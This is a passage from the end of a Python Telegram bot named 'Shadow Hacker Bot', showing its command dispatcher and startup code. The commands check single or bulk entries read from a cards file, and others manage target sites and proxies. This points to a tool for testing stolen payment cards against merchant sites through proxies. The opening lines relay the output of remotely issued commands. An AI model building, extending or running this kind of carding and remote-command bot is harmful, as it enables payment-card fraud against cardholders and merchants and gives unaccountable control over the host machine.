            await update.message.reply_text(f"<b>💻 Output:</b>\n<pre>{output}</pre>", parse_mode='HTML')
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
        context.user_data['awaiting_cmd'] = False
        return
    
    if update.message.text.startswith('/sh '):
        await single_check(update, context)
        return
    elif update.message.text == '/msh':
        await multi_check(update, context)
        return
    elif update.message.text == '/mtxt':
        await file_check(update, context)
        return
    elif update.message.text.startswith('/addsite '):
        await add_site_command(update, context)
        return
    elif update.message.text.startswith('/delsite '):
        await del_site_command(update, context)
        return
    elif update.message.text == '/sites':
        await list_sites(update, context)
        return
    elif update.message.text.startswith('/chksite '):
        await check_site(update, context)
        return
    elif update.message.text.startswith('/addproxy '):
        await add_proxy_command(update, context)
        return
    elif update.message.text.startswith('/delproxy '):
        await del_proxy_command(update, context)
        return
    elif update.message.text == '/proxies':
        await list_proxies(update, context)
        return
    elif update.message.text.startswith('/chkproxy '):
        await check_proxy(update, context)
        return
    
    await update.message.reply_text("Use /start for commands.")

# ─── Error Handler ──────────────────────────────────────────────────
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    logging.error(f"Error: {context.error}")
    try:
        await update.message.reply_text("⚠️ An error occurred. Please try again.")
    except:
        pass

# ──────────────────────── MAIN ─────────────────────────────────────
def main():
    print("🐱 Shadow Hacker Bot v6.0 - ULTIMATE EDITION")
    print("Commands: /sh, /msh, /mtxt, /addsite, /delsite, /sites, /chksite")
    print("          /addproxy, /delproxy, /proxies, /chkproxy")
    
    for path in [CARDS_PATH, PROXY_PATH, SITES_PATH]:
        if not os.path.exists(path):
            with open(path, 'w') as f:
                f.write("# Add your data here\n")
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Checker commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("sh", single_check))
    application.add_handler(CommandHandler("msh", multi_check))
    application.add_handler(CommandHandler("mtxt", file_check))
    
    # Site management
    application.add_handler(CommandHandler("addsite", add_site_command))
    application.add_handler(CommandHandler("delsite", del_site_command))
    application.add_handler(CommandHandler("sites", list_sites))
    application.add_handler(CommandHandler("chksite", check_site))
    
    # Proxy management
    application.add_handler(CommandHandler("addproxy", add_proxy_command))
    application.add_handler(CommandHandler("delproxy", del_proxy_command))
    application.add_handler(CommandHandler("proxies", list_proxies))
    application.add_handler(CommandHandler("chkproxy", check_proxy))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_error_handler(error_handler)
    
    print("✅ Bot is running! All commands ready.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
